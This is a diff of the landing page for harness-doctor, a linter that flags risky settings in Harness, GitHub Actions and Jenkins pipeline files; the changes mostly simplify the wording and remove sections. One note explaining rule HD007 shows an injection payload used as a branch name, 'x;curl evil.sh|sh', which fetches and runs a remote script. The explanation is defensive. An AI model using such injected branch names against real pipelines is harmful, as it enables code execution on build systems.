@@ -49,13 +49,10 @@ nav .links a:hover{color:var(--fg)}
 .skip:focus{top:8px}
 .btn:focus-visible,textarea:focus-visible,button:focus-visible,a:focus-visible{outline:2px solid #10b981;outline-offset:2px}
 .hero{padding:72px 0 40px;text-align:center}
-.pill{display:inline-block;font-size:13px;color:var(--brand);background:var(--brand-bg);padding:4px 12px;border-radius:99px;margin-bottom:20px;font-weight:600}
 h1{font-size:clamp(34px,6vw,58px);line-height:1.08;margin:0 0 18px;letter-spacing:-.02em}
 h1 em{font-style:normal;color:var(--brand)}
 .lede{max-width:680px;margin:0 auto 28px;color:var(--mute);font-size:18px}
 .cta{display:flex;gap:12px;justify-content:center;flex-wrap:wrap}
-.stats{display:flex;gap:28px;justify-content:center;flex-wrap:wrap;margin-top:36px;color:var(--mute);font-size:14px}
-.stats b{display:block;color:var(--fg);font-size:22px}
 section{padding:56px 0}
 h2{font-size:clamp(26px,4vw,36px);margin:0 0 8px;letter-spacing:-.01em}
 .sub{color:var(--mute);margin:0 0 28px;max-width:720px}
@@ -116,12 +113,13 @@ footer .wrap{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
 .copy{z-index:2;position:absolute;top:8px;right:8px;font:600 12px system-ui;padding:6px 10px;border-radius:8px;border:1px solid #334155;background:#111c33;color:#e2e8f0;cursor:pointer;min-height:32px}
 .copy:hover{background:#1e2b47}
 .copy:focus-visible{outline:2px solid #10b981;outline-offset:2px}
-.for{color:var(--mute);font-size:15px;margin:-12px auto 24px;max-width:680px}
 @media (max-width:860px){.chip{padding:9px 12px;min-height:40px}}
 .js .rv{opacity:0;transform:translateY(18px);transition:opacity .55s ease-out,transform .55s ease-out}
 .js .rv.in{opacity:1;transform:none}
 @supports (animation-timeline:scroll()){@keyframes heroout{to{opacity:.35;transform:scale(.97)}}.hero .wrap{animation:heroout linear both;animation-timeline:scroll(root);animation-range:0 420px;transform-origin:50% 0}}
 @media (prefers-reduced-motion:reduce){*,*::before,*::after{transition:none!important;animation:none!important;scroll-behavior:auto!important}.js .rv{opacity:1;transform:none}}
+.pw{color:var(--mute);font-size:14px;margin:0 0 14px}
+.pw b{font-weight:600}
 .sr{position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0)}
 </style>
 </head>
@@ -138,24 +136,17 @@ footer .wrap{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
 </div></nav>
 
 <header class="hero" id="top"><div class="wrap">
-  <span class="pill">Open source. MIT. Runs in your browser.</span>
   <h1>Catch the pipeline mistake <em>before</em> it ships to prod.</h1>
-  <p class="lede">harness-doctor is a command-line linter for Harness pipelines, GitHub Actions workflows and Jenkinsfiles. It flags a literal token, a <code>:latest</code> image or a prod deploy with no approval, and tells you the line and the fix.</p>
-  <p class="for">Built for platform and DevOps engineers who review pipeline changes.</p>
+  <p class="lede">harness-doctor checks Harness, GitHub Actions and Jenkins pipeline files for risky settings, like a password written in the file or a deploy to prod with no approval. It shows the line and the fix.</p>
   <div class="cta">
-    <a class="btn primary" href="#try">Lint a pipeline now</a>
-    <a class="btn" href="#install">Install and add it to CI</a>
-  </div>
-  <div class="stats">
-    <div><b id="stat-rules">25</b>rules</div>
-    <div><b>4</b>output formats</div>
-    <div><b>0</b>uploads, it runs locally</div>
+    <a class="btn primary" href="#try">Lint a sample pipeline</a>
+    <a class="btn" href="#install">Install it</a>
   </div>
 </div></header>
 
 <section id="try"><div class="wrap">
-  <h2>Try it on a real pipeline</h2>
-  <p class="sub">This is the actual Python package, loaded into your browser with Pyodide. Edit the file and the findings update. Nothing you paste leaves this tab. It needs JavaScript; without it, use the CLI below.</p>
+  <h2>Try it on a sample pipeline</h2>
+  <p class="sub">This runs the real linter in your browser. Edit the file and the findings update. Nothing leaves this tab. It needs JavaScript; without it, use the install steps below.</p>
   <div class="lab">
     <div class="card">
       <h3><span id="fname">pipeline.yaml</span>
@@ -186,29 +177,20 @@ footer .wrap{display:flex;justify-content:space-between;gap:16px;flex-wrap:wrap}
       <div class="summary" id="summary" hidden></div>
     </div>
   </div>
-  <p class="note">The linter checks structure it can see in the file. It does not call Harness, resolve templates or runtime inputs, or know which secrets really exist in your account.</p>
-</div></section>
-
-<section><div class="wrap">
-  <h2>How it works</h2>
-  <p class="sub">A rule is one small Python function. No network calls, no account access, no model.</p>
-  <div class="steps">
-    <div class="step"><div class="n">1</div><h3>Parse with line numbers</h3><p>The YAML loader records the line every mapping starts on, so each finding points at the exact spot, even inside templates.</p></div>
-    <div class="step"><div class="n">2</div><h3>Run the rules</h3><p>Each rule walks the stages and steps and yields a line, a message and a fix. A comment on or just above a line silences one rule.</p></div>
-    <div class="step"><div class="n">3</div><h3>Report where you work</h3><p>Plain text for the terminal, SARIF for code scanning, JSON for scripts, and inline annotations on the pull request diff.</p></div>
-  </div>
+  
 </div></section>
 
 <section id="rules"><div class="wrap">
-  <h2>What it catches</h2>
-  <p class="sub">The rule list below is read from the running package, so it cannot drift from the code. Without JavaScript, see the <a href="https://github.com/gerardrecinto/harness-doctor#what-it-catches">README table</a>.</p>
+  <h2>What it checks</h2>
+  <p class="sub">The list comes from the linter itself, so it matches the code. Without JavaScript, see the <a href="https://github.com/gerardrecinto/harness-doctor#readme">README</a>.</p>
+  <p class="pw"><b>Put simply:</b> each row is one mistake the tool looks for, and why it is risky.</p>
   <div class="tw"><table><thead><tr><th>Rule</th><th>Severity</th><th>File</th><th>Check</th><th>Why it matters</th></tr></thead><tbody id="rules-body"><tr><td colspan="5">Loading...</td></tr></tbody></table></div>
-  <p class="note">HD007 is the one most teams miss. Harness substitutes <code>&lt;+codebase.branch&gt;</code> into the script text before the shell parses it, so a branch named <code>x;curl evil.sh|sh</code> runs as code.</p>
+  <p class="note">HD007 is easy to miss: Harness pastes <code>&lt;+codebase.branch&gt;</code> into the script before the shell reads it, so a branch named <code>x;curl evil.sh|sh</code> runs as code.</p>
 </div></section>
 
 <section id="install" class="install"><div class="wrap">
   <h2>Quick start</h2>
-  <p class="sub">Needs Python 3.10 or newer. This installs the current <code>main</code> branch from GitHub.</p>
+  <p class="sub">Needs Python 3.10 or newer. This installs the current <code>main</code> branch.</p>
   <div class="cols2">
     <div>
       <div class="qs"><button class="copy" type="button" hidden>Copy</button>
@@ -219,7 +201,8 @@ harness-doctor check .harness .github/workflows</code></pre></div>
 <pre><code>harness-doctor check .harness --fail-on warning
 harness-doctor check .harness --format sarif
 harness-doctor explain HD007</code></pre></div>
-      <p class="note">Exit codes: 0 clean, 1 findings at or above <code>--fail-on</code>, 2 bad input. A path that does not exist exits 2, so run it from a repo that has the folder.</p>
+      <p class="pw"><b>Put simply:</b> the last two commands save a report file that GitHub can read (SARIF) and explain one rule.</p>
+      <p class="note">Exit code 0 means clean, 1 means findings, 2 means bad input such as a missing folder.</p>
     </div>
     <div>
       <div class="qs"><button class="copy" type="button" hidden>Copy</button>
@@ -229,19 +212,17 @@ harness-doctor explain HD007</code></pre></div>
     path: .harness
     fail-on: warning
     schema: "true"</code></pre></div>
-      <p class="note">As a GitHub Action, findings appear on the pull request and in the Security tab. The GitHub Actions and Jenkins rules are on <code>main</code> but not in the v0.1.1 release yet, so v0.1.1 checks Harness files only. There is also a pre-commit hook and an OPA policy, <code>policies/pipeline_guardrails.rego</code>; both are in the <a href="https://github.com/gerardrecinto/harness-doctor#use-it">README</a>.</p>
+      <p class="pw"><b>Put simply:</b> this runs the check automatically on every pull request.</p>
+      <p class="note">The Action puts findings on the pull request. The Actions and Jenkins rules are on <code>main</code> but not in v0.1.1, so v0.1.1 checks Harness files only. A pre-commit hook is in the <a href="https://github.com/gerardrecinto/harness-doctor#readme">README</a>.</p>
     </div>
   </div>
-</div></section>
-
-<section><div class="wrap">
   <div class="limits">
     <strong>What this does not do</strong>
     <ul>
-      <li>It is a linter. It does not prove a pipeline is safe, only that these patterns are absent.</li>
-      <li>It reads one file at a time. It does not resolve templates, runtime inputs or account-level policy.</li>
-      <li>Jenkins checks read the Groovy text, not a parsed model, so a dynamically built pipeline can hide a finding.</li>
-      <li>A secret that does not look like a secret by name or format will not be flagged.</li>
+      <li>It is a linter. It shows these patterns are absent, not that a pipeline is safe.</li>
+      <li>It reads one file at a time. It does not resolve templates, runtime inputs or account policy, and does not know which secrets exist.</li>
+      <li>Jenkins checks read the Groovy text, so a dynamically built pipeline can hide a finding.</li>
+      <li>A secret that does not look like one by name or format is not flagged.</li>
     </ul>
   </div>
 </div></section>
@@ -342,7 +323,6 @@ def rules():
       py.runPython("import sys; sys.path.insert(0, '/lib')");
       py.runPython(PY_RUN);
       const rs = JSON.parse(py.runPython("rules()"));
-      $("stat-rules").textContent = rs.length;
       $("rules-body").innerHTML = rs.map((r) => `<tr><td>${r.id}</td><td><span class="badge ${r.severity}">${r.severity}</span></td><td>${KINDS[r.kind] || r.kind}</td><td>${esc(r.title)}</td><td>${esc(r.why)}</td></tr>`).join("");
       window.__HD_READY__ = true;
       lint();
